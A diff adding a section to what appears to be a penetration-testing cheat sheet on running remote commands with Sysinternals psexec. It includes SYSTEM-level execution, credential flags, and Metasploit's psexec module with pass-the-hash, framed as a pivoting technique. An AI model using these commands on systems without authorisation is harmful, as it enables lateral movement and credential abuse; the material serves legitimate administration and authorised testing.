@@ -502,3 +502,35 @@ Python:     example.py [arg]
 Bash:       example.sh [arg]
             echo $1
 ```
+
+---
+
+### Running Remote Commands (psexec) ###
+To run commands against a remote system leverage `psexec`, not included in Windows by default it is apart of [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/). 
+Features:
+- Requires SMB session
+- Run as local `SYSTEM` privileges  with `-s` flag.
+- Run as specific user `-u [username] -p [password]`.
+- Daemonize with `-d` flag; detache and runs in background.
+- Copy program to remove system with `-c`.
+- By not specifying a user to run as it will default to the current user.
+
+```
+C:\> psexec \\[remote_ip] -u [username] -p [password] [command]
+C:\> psexec \\[remote_ip] -d -s [command]
+C:\> psexec \\[remote_ip] -c [command]
+```
+
+Metasploits version of `psexec` supports _pass-the-hash_ capabilities.
+```
+msf > use exploit/windows/smb/psexec
+msf > set PAYLOAD [payload]
+msf > set RHOST [remote_ip]
+msf > SMBUser [username]
+msf > SMBPass [password]
+    or
+msf > SMBPass [hash]
+```
+
+Note: Pivoting via `psexec` minimizes unintended crashes etc.
+
